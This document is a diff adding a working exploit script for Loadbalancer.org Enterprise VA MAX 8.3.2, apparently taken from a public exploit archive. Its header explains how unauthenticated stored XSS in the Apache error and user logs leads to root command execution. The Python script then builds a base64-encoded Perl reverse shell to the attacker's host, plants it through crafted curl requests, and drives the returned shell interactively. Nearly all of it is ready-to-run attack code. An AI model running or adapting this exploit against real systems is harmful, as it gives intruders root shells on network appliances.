@@ -1,0 +1,97 @@
+# Exploit Title: Loadbalancer.org Enterprise VA MAX 8.3.2 - Remote Code Execution
+# Date: 2018-07-24
+# Exploit Authors: Jakub Palaczynski
+# Vendor Homepage: https://www.loadbalancer.org/
+# Version: <= 8.3.2
+# CVE: N/A
+
+# Exploit Description: Loadbalancer.org Enterprise VA MAX - Remote Code Execution via Unauthenticated Stored XSS
+# Info: It is advised to use HTTPS port instead of HTTP for sending payloads as storing JavaScript in "Apache Error Log" does not work for HTTP.
+# Info: JavaScript can be easily changed to for example modify SSH configuration or add/modify web users
+
+# Basic Information:
+# Two instances of Stored XSS were found - exploit uses both:
+# 1. It is possible to inject custom JavaScript code during authentication to "/lbadmin/".
+# Application takes input from Basic Auth (username) and stores it without encoding/sanitization/filtering in "Apache Error Log".
+# This instance only forks for HTTPS.
+# 2. It is possible to inject custom JavaScript code by accessing URL like /?<XSS>.
+# Such JavaScript is stored in "Apache User Log".
+
+# This way attacker can store JavaScript code that can for example execute system command as root. This is actually what this exploit does - spawns reverse shell.
+# When application user browses "Apache Error Log" or "Apache User Log" custom JavaScript code gets automatically executed.
+
+
+#!/usr/bin/python
+
+import socket
+import sys
+import os
+import threading
+import subprocess
+import time
+import base64
+
+# print help or assign arguments
+if len(sys.argv) != 3:
+    sys.stderr.write("[-]Usage: python %s <our_ip:port> <proto://remote_ip:port>\n" % sys.argv[0])
+    sys.stderr.write("[-]Exemple: python %s 192.168.1.1:80 https://192.168.1.2:9443\n" % sys.argv[0])
+    sys.exit(1)
+
+lhost = sys.argv[1] # our ip address and port
+rhost = sys.argv[2] # ip address and port of vulnerable Loadbalancer
+raw = """perl -e 'use Socket;$i=\"""" + lhost.split(":")[0] + """\";$p=""" + lhost.split(":")[1] + """;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""" # raw reverse shell in perl
+payload_url = 'document.getElementById("lb").contentDocument.forms[0].elements["command"].value = "echo ' + base64.b64encode(raw.encode("ascii")) + ' | base64 -d | bash";document.getElementById("lb").contentDocument.forms[0].submit();' # base64 encoded reverse shell in perl
+payload_auth = "<iframe id='lb'/src='/lbadmin/config/command.php'/style='width&colon;0;height&colon;0;border&colon;0;border&colon;none;'/onload=eval(atob('" + base64.b64encode(payload_url.encode("ascii")) + "'))></iframe>:pwd" # base64 encoded reverse shell in perl
+
+# for additional thread to send request in parallel
+class requests (threading.Thread):
+    def run(self):
+        time.sleep(5)
+	# send requests to trigger vulnerability
+	os.system('curl -s -k -m 10 -X "GET" -H "Authorization: Basic ' + base64.b64encode(payload_auth.encode("ascii")) + '" "' + rhost + '/lbadmin/" > /dev/null') # store payload in Apache Error logs
+	os.system('curl -s -k -m 10 -X "GET" "' + rhost + '/?<iframe/id=\'lb\'/src=\'/lbadmin/config/command.php\'/onload=\'eval(atob(\`' + base64.b64encode(payload_url.encode("ascii")) + '\`))\'/style=\'width:0;height:0;border:0;border:none;\'></iframe>" > /dev/null') # store payload in Apache User logs
+
+# for additional thread to receive data from socket
+class receiving (threading.Thread):
+    def __init__(self, conn):
+        threading.Thread.__init__(self)
+        self.conn = conn
+	self._is_running = True
+    def stop(self):
+	self._is_running = False
+    def run(self):
+        while (self._is_running):
+            cmd = conn.recv(1024)
+            sys.stdout.write(cmd)
+            sys.stdout.flush()
+	    if cmd == '':
+		break
+	threadr.stop()
+
+# function that creates socket
+def create_socket(port):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    sock.bind(('0.0.0.0', port))
+    sock.listen(10)
+    conn, addr = sock.accept()
+    return sock, conn, addr
+
+# start thread that sends request
+print 'Sending requests that triggers vulnerability.'
+thread = requests()
+thread.start()
+
+# create socket to receive shell
+print 'Now you need to wait for shell.'
+sock, conn, addr = create_socket(int(lhost.split(":")[1]))
+threadr = receiving(conn)
+threadr.start()
+while True:
+    cmd = raw_input("")
+    if cmd == 'exit':
+	conn.send(cmd + "\n")
+        break
+    else:
+        conn.send(cmd + "\n")
+sock.close()
